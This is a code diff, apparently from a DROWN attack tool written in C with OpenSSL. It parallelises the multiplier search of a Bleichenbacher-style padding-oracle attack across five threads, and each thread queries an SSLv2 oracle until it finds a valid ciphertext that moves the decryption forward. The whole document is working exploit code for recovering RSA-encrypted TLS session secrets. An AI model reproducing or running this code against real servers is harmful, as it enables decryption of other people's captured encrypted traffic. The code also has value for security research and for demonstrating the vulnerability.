@@ -1,6 +1,7 @@
 #include <openssl/bn.h>
 #include <openssl/err.h>
 #include <openssl/ssl.h>
+#include <pthread.h>
 #include "decrypt.h"
 #include "oracle.h"
 
@@ -63,19 +64,40 @@ int oracle_valid(drown_ctx *dctx, BIGNUM *c)
     return 0;
 }
 
-/*
-    Finds a multiplier s, so that c * (s * l_1) ** e is valid
-    Updates c, s, mt, l, ?
-*/
-int find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNUM * ss)
-{
-    BIGNUM *c = dctx->c;
-    BIGNUM *n = dctx->n;
-    BIGNUM *e = dctx->e;
+#define NUM_THREADS 5
 
+struct shared_data_t
+{
+    drown_ctx *dctx;
+    BIGNUM *mt;
+    BIGNUM *l_1;
+    BIGNUM *ss;
+    pthread_mutex_t mutex;
+    int done;
+    int l;
+};
+
+struct shared_data_t shared_data = {
+    .mutex = PTHREAD_MUTEX_INITIALIZER,
+};
+
+void * find_multiplier_thread(void *data)
+{
+    int num = (int)data;
+
+    BIGNUM *c = shared_data.dctx->c;
+    BIGNUM *n = shared_data.dctx->n;
+    BIGNUM *e = shared_data.dctx->e;
+    BIGNUM *l_1 = shared_data.l_1;
+
+    BN_CTX *ctx = BN_CTX_new();
     BN_CTX_start(ctx);
-    BIGNUM * inc = BN_CTX_get(ctx);
-    BIGNUM * upperbits = BN_CTX_get(ctx);
+
+    BIGNUM *inc = BN_CTX_get(ctx);
+    BIGNUM *mt = BN_CTX_get(ctx);
+    BN_copy(mt, shared_data.mt);
+    BIGNUM *ss = BN_CTX_get(ctx);
+    BIGNUM *upperbits = BN_CTX_get(ctx);
     BIGNUM *se = BN_CTX_get(ctx);
     BIGNUM *l_1e = BN_CTX_get(ctx);
     BIGNUM *cl_1e = BN_CTX_get(ctx);
@@ -88,10 +110,21 @@ int find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNU
     // We will try every value of s, so we will add instead of multiplying
     // Compute our increment
     BN_mod_mul(inc, mt, l_1, n, ctx);
-    BN_zero(mt);
+
+    // Since we have several threads, each one will test the values of s in {num + i * NUM_THREADS}
+    BIGNUM *ii = BN_new();
+    BN_set_word(ii, num);
+    BIGNUM *nn = BN_new();
+    BN_set_word(nn, NUM_THREADS);
+    BN_mod_mul(mt, inc, ii, n, ctx);
+    BN_mod_mul(inc, inc, nn, n, ctx);
+    BN_free(ii);
+    BN_free(nn);
+
 
     // Search multiplier
-    for(unsigned long s = 1; l == 0; s++)
+    unsigned long s;
+    for(s = num + NUM_THREADS; l == 0 && !shared_data.done; s += NUM_THREADS)
     {
         BN_mod_add(mt, mt, inc, n, ctx);
         // Check if the upper bits are 0x0002
@@ -103,16 +136,51 @@ int find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNU
             BN_mod_exp(se, ss, e, n, ctx);
             BN_mod_mul(cc, cl_1e, se, n, ctx);
 
-            l = oracle_valid(dctx, cc);
+            l = oracle_valid(shared_data.dctx, cc);
         }
     }
 
-    BN_copy(c, cc);
+    if(l)
+    {
+        pthread_mutex_lock(&shared_data.mutex);
+        if(!shared_data.done)
+        {
+            shared_data.done = 1;
+            // We found a result, save it
+            BN_copy(c, cc);
+            BN_copy(shared_data.mt, mt);
+            BN_copy(shared_data.ss, ss);
+            shared_data.l = l;
+        }
+        pthread_mutex_unlock(&shared_data.mutex);
+    }
 
     BN_CTX_end(ctx);
+    BN_CTX_free(ctx);
 
-    return l;
+    return NULL;
 }
+
+int threaded_find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNUM * ss)
+{
+    pthread_t tids[NUM_THREADS];
+
+    shared_data.dctx = dctx;
+    shared_data.mt = mt;
+    shared_data.l_1 = l_1;
+    shared_data.ss = ss;
+    shared_data.done = 0;
+
+    for(int i = 0; i < NUM_THREADS; i++)
+        pthread_create(&tids[i], NULL, find_multiplier_thread, (void *)i);
+
+    for(int i = 0; i < NUM_THREADS; i++)
+        pthread_join(tids[i], NULL);
+
+    return shared_data.l;
+}
+
+
 
 /*
     We have c0 = m0 ** e (mod n)
@@ -160,7 +228,7 @@ void decrypt(drown_ctx *dctx)
         BN_mod_inverse(l_1, l_1, n, ctx);
 
         // Find a multiplier
-        l = find_multiplier(dctx, mt, l_1, ctx, ss);
+        l = threaded_find_multiplier(dctx, mt, l_1, ctx, ss);
 
         // Remember our multiplier
         BN_mod_mul(S, S, ss, n, ctx);
